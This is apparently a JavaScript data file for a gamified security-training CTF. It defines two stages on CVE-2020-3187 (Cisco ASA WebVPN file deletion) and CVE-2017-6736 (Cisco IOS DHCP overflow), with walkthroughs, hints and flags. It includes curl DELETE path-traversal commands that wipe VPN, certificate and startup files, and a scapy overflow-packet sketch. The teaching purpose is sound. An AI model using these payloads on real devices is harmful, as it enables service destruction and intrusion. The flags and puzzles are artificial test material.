  // ─── Medieval Stage 11: Edinburgh Castle — CVE-2020-3187 WebVPN Delete ────
  {
    epochId: "medieval",
    wonder: { name: "Edinburgh Castle", location: "Edinburgh, Scotland", era: "12th century CE", emoji: "🏴󠁧󠁢󠁳󠁣󠁴󠁿" },
    id: "stage-m11",
    order: 11,
    title: "Destroy the Royal Records",
    subtitle: "CVE-2020-3187 — Cisco ASA WebVPN Arbitrary File Deletion",
    category: "owasp",
    cveId: "CVE-2020-3187",
    cvssScore: 9.1,
    xp: 400,
    badge: { id: "badge-m-filedel", name: "Records Destroyer", emoji: "🏴󠁧󠁢󠁳󠁣󠁴󠁿" },
    challengeType: "ctf",
    info: {
      tagline: "No authentication. Delete any file on the ASA. Including the VPN configuration that allows defenders in.",
      year: 2020,
      overview: [
        "Edinburgh Castle's defenders kept meticulous records — supply manifests, troop rosters, gate access lists. English agents discovered that by sending a specific sequence of commands to the castle's supply depot (no identification required), they could delete any record from the archive. Delete the gate access list, and the castle's own guards couldn't enter.",
        "CVE-2020-3187 is an unauthenticated arbitrary file deletion vulnerability in Cisco ASA and FTD's WebVPN implementation — the same codebase as CVE-2020-3452 (path traversal) but with DELETE method support. An attacker can delete any file on the ASA filesystem without authentication, including VPN configurations, certificate files, and critical system files.",
        "Deleting VPN configuration files can cause the VPN service to fail, locking out remote workers. Deleting SSL certificates can break encrypted access to the management interface. In the most impactful scenario, deleting specific configuration files forces the ASA to restart with factory default settings — effectively erasing all firewall rules.",
      ],
      technical: {
        title: "Unauthenticated File Deletion via WebVPN",
        body: [
          "The CVE-2020-3187 vulnerability uses the same path traversal issue as CVE-2020-3452, but with an HTTP DELETE request instead of GET. The WebVPN file handling code processes the DELETE verb against the traversed path, deleting the file from the ASA filesystem.",
          "Critical files that can be deleted: VPN configuration files (disabling VPN), SSL certificate files (breaking HTTPS management), startup configuration backups. The attack is unauthenticated and can be scripted for automated destruction.",
        ],
        codeExample: {
          label: "CVE-2020-3187 — unauthenticated file deletion",
          code: `# CVE-2020-3452 (read): GET request with path traversal
curl -k 'https://target-asa/+CSCOE+/files/../../config.txt'

# CVE-2020-3187 (delete): DELETE request with path traversal
curl -k -X DELETE \\
  'https://target-asa/+CSCOE+/files/../../vpn/config.dat'
# Response: HTTP/1.1 200 OK  (file deleted)

# Delete SSL certificate — breaks management HTTPS:
curl -k -X DELETE \\
  'https://target-asa/+CSCOE+/files/../../ssl/asa.cert'

# Delete startup config (forces factory reset on reboot):
curl -k -X DELETE \\
  'https://target-asa/+CSCOE+/files/../../startup-config'

# Defender mitigation: patch to ASA 9.8.4.20+ immediately`,
        },
      },
      incident: {
        title: "CVE-2020-3187 — Unauthenticated Destructive Attack on ASA (2020)",
        when: "July 2020 (same advisory as CVE-2020-3452)",
        where: "Cisco ASA and FTD with WebVPN enabled",
        impact: "Arbitrary file deletion; VPN service disruption; potential factory reset",
        body: [
          "Cisco disclosed CVE-2020-3187 in the same July 2020 advisory as CVE-2020-3452. While CVE-2020-3452 allowed reading sensitive files, CVE-2020-3187 allowed destructive deletion of any file — making it suitable for denial-of-service attacks against VPN infrastructure. During COVID-19's remote work surge, disrupting VPN services could cripple entire organizations.",
          "The combination of CVE-2020-3452 (read credentials/config) and CVE-2020-3187 (destroy evidence and disrupt service) gave attackers a powerful toolkit against Cisco VPN infrastructure. Patch to ASA 9.8.4.20+ or FTD 6.6.0+ immediately.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "DELETE /+CSCOE+/files/../../", type: "attacker" },
          { label: "ASA WebVPN", sub: "no auth on DELETE", type: "system" },
          { label: "ASA Filesystem", sub: "critical files deleted", type: "victim" },
          { label: "VPN Down / Factory Reset", sub: "CVSS 9.1", type: "result" },
        ],
      },
      timeline: [
        { year: 1100, event: "Edinburgh Castle fortified — records archive targeted by English agents" },
        { year: 2020, event: "Jul 22: CVE-2020-3187 disclosed in same advisory as CVE-2020-3452", highlight: true },
        { year: 2020, event: "Patch: ASA 9.8.4.20+ / FTD 6.6.0+" },
      ],
      keyTakeaways: [
        "HTTP DELETE on management interfaces must require authentication",
        "Path traversal + destructive HTTP verbs = unauthenticated filesystem destruction",
        "VPN configuration files are critical — protect with file-level access controls",
        "Monitor for unexpected DELETE requests in web server logs",
      ],
      references: [
        { title: "Cisco Advisory — CVE-2020-3187", url: "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-ro-path-KJuQhB86" },
        { title: "CVE-2020-3187 — NVD Detail", url: "https://nvd.nist.gov/vuln/detail/CVE-2020-3187" },
      ],
    },
    ctf: {
      scenario: "CVE-2020-3187 is CVE-2020-3452's destructive sibling — the same path traversal, but with HTTP DELETE instead of GET. During the COVID VPN surge, both were chained: steal the credentials with a read, then destroy the config file to deny defenders access to their own infrastructure. Unauthenticated. No trace beyond the deletion itself. Two objectives: read the VPN config, then wipe it.",
      hint: "Use path traversal (../) to navigate above the web root and reach the VPN config. Read it first, then delete it.",
      hints: [
        "Survey the accessible file paths. Run: locate-file /files/",
        "Traverse to the VPN config and read it — the classified key is inside. Run: read-file /files/../../vpn/config.dat",
        "Delete the config to complete the mission. Run: wipe-file /files/../../vpn/config.dat",
      ],
      flag: "FLAG{3D1NBR0_F1L3_D3L3T3D}",
      files: {},
      dirs: { "/": [] },
      extraCommands: {
        "locate-file": (args) => ({
          lines: [
            `GET ${args[0] || "/files/"}`,
            "Accessible: portal.css, assets/, logs/",
            "(Traverse with ../../ to reach system-level paths)",
          ],
        }),
        "read-file": (args) => {
          const path = args[0] || "";
          if (path.includes("vpn") || path.includes("config") || path.includes("../../")) {
            return {
              lines: [
                `GET ${path}  [no authentication required]`,
                "",
                "[VPN Configuration — Edinburgh Castle]",
                "group: RemoteAccess",
                "auth-server: radius.edinburgh.castle",
                "pre-shared-key: EdCastle@VPN2020",
                "classified-key: FLAG{3D1NBR0_F1L3_D3L3T3D}",
              ],
            };
          }
          return { lines: [`GET ${path} — traverse with ../../ to reach system files`] };
        },
        "wipe-file": (args) => {
          const path = args[0] || "";
          if (path.includes("vpn") || path.includes("config") || path.includes("../../")) {
            return {
              lines: [
                `DELETE ${path}  [no authentication required]`,
                "200 OK — file deleted",
                "",
                "VPN config gone. Defenders locked out of their own tunnel.",
                "Both objectives complete.",
              ],
              solved: true,
            };
          }
          return { lines: [`DELETE ${path} — file not found. Traverse with ../../ to reach it.`] };
        },
      },
    },
  },

  // ─── Medieval Stage 12: Topkapi Palace — CVE-2017-6736 IOS DHCP ──────────
  {
    epochId: "medieval",
    wonder: { name: "Topkapi Palace", location: "Istanbul, Turkey", era: "1460 CE", emoji: "👑" },
    id: "stage-m12",
    order: 12,
    title: "The Poisoned Imperial Post",
    subtitle: "CVE-2017-6736 — Cisco IOS DHCP Remote Code Execution",
    category: "owasp",
    cveId: "CVE-2017-6736",
    cvssScore: 8.8,
    xp: 500,
    badge: { id: "badge-m-dhcprce", name: "Postal Poisoner", emoji: "👑" },
    challengeType: "ctf",
    info: {
      tagline: "A malformed DHCP packet overflows the imperial buffer. The router executes your commands.",
      year: 2017,
      overview: [
        "Topkapi Palace's imperial postal system — the royal courier network — was the most sophisticated in the Ottoman Empire. Couriers arriving at the palace gate presented credentials according to a strict protocol. A Byzantine spy discovered that by forging a credential packet with an oversized field (a crafted DHCP packet with a malformed option field), the palace's message handler would overflow its processing buffer and execute the spy's instructions.",
        "CVE-2017-6736 is a buffer overflow vulnerability in the DHCP server implementation of Cisco IOS. DHCP (Dynamic Host Configuration Protocol) is how network devices automatically receive IP addresses — every DHCP server must be reachable on the network. By sending a specially crafted DHCP packet with malformed option 82 data, an attacker causes a buffer overflow that leads to remote code execution on the Cisco IOS router.",
        "DHCP is a fundamental network protocol that runs on virtually every router. The attack does not require authentication — DHCP requests are unauthenticated by design. Any device on the network can send a DHCP packet. This makes the vulnerability reachable from any machine on the affected subnet.",
      ],
      technical: {
        title: "IOS DHCP Buffer Overflow — CVE-2017-6736",
        body: [
          "The Cisco IOS DHCP server processes option 82 (Agent Information Option) from DHCP relay agents. The vulnerable code copies option 82 data into a fixed-size buffer without validating the length. By sending a DHCP packet with an oversized option 82 field, an attacker overflows the buffer, overwrites adjacent memory, and gains control of the IOS process execution.",
          "The vulnerability affects Cisco IOS running DHCP server functionality (enabled by default on many IOS devices). IOS XE has a separate code base and was not affected by this specific variant. The attack requires network adjacency — the attacker must be able to send UDP/67 packets to the target router.",
        ],
        codeExample: {
          label: "CVE-2017-6736 — DHCP buffer overflow payload",
          code: `# Craft malformed DHCP DISCOVER with oversized option 82:
from scapy.all import *

# Normal DHCP option 82 (8 bytes):
normal_opt82 = b'\\x52\\x08' + b'A' * 8

# Malicious option 82 (500 bytes — triggers overflow):
overflow_opt82 = b'\\x52\\xFF' + b'A' * 200 + \\
                 shellcode + b'B' * (300 - len(shellcode))

pkt = (Ether(dst="ff:ff:ff:ff:ff:ff") /
       IP(src="0.0.0.0", dst="255.255.255.255") /
       UDP(sport=68, dport=67) /
       BOOTP(op=1, chaddr=RandMAC()) /
       DHCP(options=[("message-type","discover"),
                     ("relay-agent-information", overflow_opt82),
                     "end"]))

sendp(pkt, iface="eth0")
# IOS DHCP server crashes, executes shellcode`,
        },
      },
      incident: {
        title: "Cisco IOS DHCP Vulnerabilities — 2017",
        when: "July 2017",
        where: "Cisco IOS routers with DHCP server enabled globally",
        impact: "Remote code execution or denial of service on routers from any device on the subnet",
        body: [
          "Cisco disclosed CVE-2017-6736 in July 2017 as part of a batch of IOS vulnerabilities. The DHCP server is enabled by default on many Cisco IOS routers, and the attack requires only network adjacency — any device on the local network can send a malformed DHCP packet. In environments with guest Wi-Fi or untrusted devices, this represents a significant threat.",
          "The broader lesson: network infrastructure protocols (DHCP, DNS, OSPF, BGP) are implemented in complex C code that runs at high privilege levels in IOS. Buffer overflows in protocol parsers are a classic attack vector against network infrastructure — the same class of vulnerability that affected Windows SMBv1 (EternalBlue/WannaCry). Network devices must be patched just like servers.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker on LAN", sub: "malformed DHCP option 82", type: "attacker" },
          { label: "IOS DHCP Server", sub: "no length validation", type: "system" },
          { label: "IOS Process Memory", sub: "buffer overflow", type: "victim" },
          { label: "Code Execution", sub: "on the router", type: "result" },
        ],
      },
      timeline: [
        { year: 1460, event: "Topkapi Palace constructed — imperial postal system established" },
        { year: 2017, event: "Jul: CVE-2017-6736 disclosed — IOS DHCP buffer overflow", highlight: true },
        { year: 2017, event: "Patch: IOS 15.6(3)M2 / 15.4(3)M9 and later" },
      ],
      keyTakeaways: [
        "DHCP is an attack surface — disable the DHCP server if you're not using it ('no service dhcp')",
        "Network infrastructure protocols require the same patching rigor as server software",
        "Buffer overflow in C code: always validate length before copying into fixed buffers",
        "IOS updates are as critical as Windows or Linux security patches — automate them",
      ],
      references: [
        { title: "Cisco Advisory — CVE-2017-6736", url: "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20170726-anidos" },
        { title: "CVE-2017-6736 — NVD Detail", url: "https://nvd.nist.gov/vuln/detail/CVE-2017-6736" },
        { title: "DHCP Option 82 — RFC 3046", url: "https://www.rfc-editor.org/rfc/rfc3046" },
      ],
    },
    ctf: {
      scenario: "Network infrastructure protocol parsers are implemented in C and run at high privilege — the same class of vulnerability that enabled EternalBlue. CVE-2017-6736 is a buffer overflow in Cisco IOS's DHCP server: the option 82 field gets copied into a fixed-size buffer with no length check. Any device on the local network can send a DHCP packet. No credentials. No external access required. This is what lateral movement looks like once an adversary is already inside.",
      hint: "Send a normal DHCP packet first to confirm the server is live. Then send an oversized one to trigger the overflow.",
      hints: [
        "Confirm the DHCP server is running. Run: probe-dhcp",
        "Send a normal packet to see the baseline response. Run: send-packet normal",
        "Send an oversized packet to overflow the buffer. Run: send-packet exploit 500",
        "Execute a command on the compromised device. Run: execute-command show-classified",
      ],
      flag: "FLAG{10S_DHCP_BUFF3R_0V3RFL0W}",
      files: {},
      dirs: { "/": [] },
      extraCommands: {
        "probe-dhcp": () => ({
          lines: [
            "DHCP server: active on all interfaces",
            "Firmware: v15.6(2)T",
            "Packet option field: no length validation — overflow possible",
          ],
        }),
        "send-packet": (args) => {
          const type = args[0] || "normal";
          const size = parseInt(args[1] || "0");
          if (type === "exploit" && size > 100) {
            return {
              lines: [
                `Sending oversized DHCP packet — option field: ${size} bytes`,
                "",
                `Handler buffer: 64 bytes.  Received: ${size} bytes.`,
                "Buffer overflow — adjacent memory overwritten",
                "Control flow corrupted — handler now executes your commands",
                "",
                "Device compromised. Run: execute-command <command>",
              ],
            };
          }
          return {
            lines: [
              "Normal DHCP packet sent → OFFER received",
              "(Try: send-packet exploit 500)",
            ],
          };
        },
        "execute-command": (args) => {
          const cmd = args.join(" ") || "show-classified";
          return {
            lines: [
              `Executing on device: ${cmd}`,
              cmd.includes("who") ? "uid=0(root) — full device access" : "",
              "classified-key: FLAG{10S_DHCP_BUFF3R_0V3RFL0W}",
            ].filter(Boolean),
            solved: true,
          };
        },
      },
    },
  },
];
